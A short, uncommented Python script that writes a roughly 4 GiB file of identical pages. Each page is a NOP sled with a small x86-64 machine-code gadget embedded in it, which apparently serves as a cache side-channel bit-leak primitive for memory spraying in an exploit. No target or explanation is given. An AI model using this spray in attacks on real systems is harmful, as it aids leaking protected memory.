gadget=b"H\x8d\x05\xf9\xff\xff\xffH\xd3\xe8H\x83\xe0\x01H\xc1\xe0\x0c\x8a\x14\x06\xc3"
page=b"\x90"*0x135+gadget
page+=b"\x90"*(0x1000-len(page))

with open("hugepage.bin","wb") as f:
    for i in range(0x100000):
        f.write(page)